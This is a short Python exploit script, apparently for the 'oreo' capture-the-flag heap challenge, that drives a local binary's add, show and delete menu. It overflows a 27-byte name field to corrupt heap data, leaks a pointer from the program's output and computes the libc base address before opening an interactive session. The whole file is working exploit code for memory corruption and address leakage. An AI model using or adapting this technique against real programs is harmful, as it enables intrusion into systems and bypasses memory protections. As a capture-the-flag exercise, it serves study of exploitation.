#!/usr/bin/python
from pwn13 import *
#from pwn import *

stdin_addr=0x804a280
#stdin_addr=0x804a190

def ADD(name, desc):
    p.sendline("1")
    p.sendline(name)
    p.sendline(desc)

def SHOW():
    p.sendline("2")
    data = p.recv()
    print data
    return data

def DEL():
    p.sendline("3")
    data = p.recv()
    print data

def leak():
    ADD("a","a")
    ADD(p8(0x41)*27,"b")
    #ADD(p8(0x0)*27+p32(stdin_addr),"b")
    p.heap(0x1410, 0x200)

    data = SHOW()
    addr = data[data.rfind(":")+2:data.rfind(":")+6]
    libc_base = u32(addr) - 0x1b25a0
    print 'libc_base', hex(libc_base)
    return libc_base

if __name__=="__main__":
    p = process("./oreo")
    print p.recvuntil("Exit!")
    print p.recvline()

    libc_base = leak()

    p.interactive()

    p.close()
